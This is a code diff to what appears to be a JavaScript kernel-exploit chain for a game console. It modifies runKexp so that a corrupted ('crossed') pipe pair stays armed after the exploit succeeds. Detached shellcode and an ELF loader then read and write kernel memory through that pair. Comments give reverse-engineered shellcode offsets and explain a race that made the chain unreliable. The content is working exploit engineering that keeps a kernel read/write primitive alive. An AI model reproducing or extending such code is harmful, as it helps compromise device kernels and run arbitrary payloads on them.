@@ -454,11 +454,9 @@ async function prepareShellcodePipes(krw, master, victim, log) {
   const victimPipe = await pipeOf(victim.readFd);
 
   // Save the pair's real kmalloc buffers before the crossing re-points them.
-  // restoreShellcodePipes() puts them back once the shellcode thread has
-  // joined: the kernel frees pipe->buffer when the app closes, and freeing a
-  // buffer that still points at the other pipe's struct is the panic users see
-  // as "the console froze after reboot" (same discipline as the exploit pair's
-  // savePipeBuffers/restoreRealBuffers).
+  // restoreShellcodePipes() puts them back only when the shellcode never ran
+  // or the loader never came up: while the loader lives, its rfork child owns
+  // the crossed pair and reads kernel memory through it.
   const saved = {
     master: {
       buffer: await krw.read8(masterPipe.add32(PIPE.buffer)),
@@ -814,7 +812,12 @@ export async function loadOptionalPayloads(p, chain, log, options = {}) {
  * @param {object} chain  ROP worker
  * @param {function} log  progress sink
  * @param {object} config optional { kexp, elfldr, payloadUrl }
- * @returns {Promise<boolean>} true once the shellcode thread joined cleanly
+ * @returns {Promise<{pipes: {master: object, victim: object, saved: object}}>}
+ *   the crossed shellcode pair's context on success. The pair stays crossed on
+ *   purpose: the detached shellcode and then the elfldr bootstrap read and
+ *   write kernel memory through it, and the loader's rfork child keeps the fds
+ *   alive after this process dies. The caller un-crosses only when the loader
+ *   never came up. Throws (after un-crossing) when the thread never started.
  */
 export async function runKexp(krw, p, chain, log, config) {
   config = config || {};
@@ -908,12 +911,25 @@ export async function runKexp(krw, p, chain, log, config) {
         "kexp: join returned " + hex(joinResult) + ", the shellcode crashed",
       );
 
-    return true;
-  } finally {
-    // The shellcode thread has joined (or failed): un-cross the pair now, so
-    // the process exit frees two ordinary pipe buffers instead of armed ones.
-    // Runs on failure too -- a crashed shellcode leaves the pair armed and
-    // that is exactly what kills the console at app close.
+    // Do NOT un-cross the pair here. The detached shellcode thread is only just
+    // starting its kernel-read/write bootstrap, and that bootstrap runs THROUGH
+    // this crossed pair: the blob aims the victim ring with write(master_fd)
+    // and reads aimed kernel memory with read(victim_fd) (REA of the kexp
+    // blob, walker at 0x1488-0x14c8, five syscall thunks down from entry).
+    // Un-crossing here raced that bootstrap: boots where the restore won ended
+    // in "elfldr did not come up" or in garbage-address kernel writes -- the
+    // alternating success/crash boot. The stable reference keeps the pair
+    // crossed until the loader is fully installed, and the loader owns it
+    // after that: its rfork_thread child holds the same fds, so the pipe
+    // objects outlive this process and nothing armed is freed at app close.
+    // Hand the context back so run() can still un-cross when the loader never
+    // came up (dead shellcode, nobody holding the fds).
+    return { pipes: { master, victim, saved: savedPipes } };
+  } catch (e) {
+    // Failure before the shellcode thread existed: nobody is using the crossed
+    // pair, and leaving it armed frees an armed buffer at app close. Un-cross
+    // now; a successful spawn hands the pair to the loader instead (above).
     await restoreShellcodePipes(krw, master, victim, savedPipes, say);
+    throw e;
   }
 }
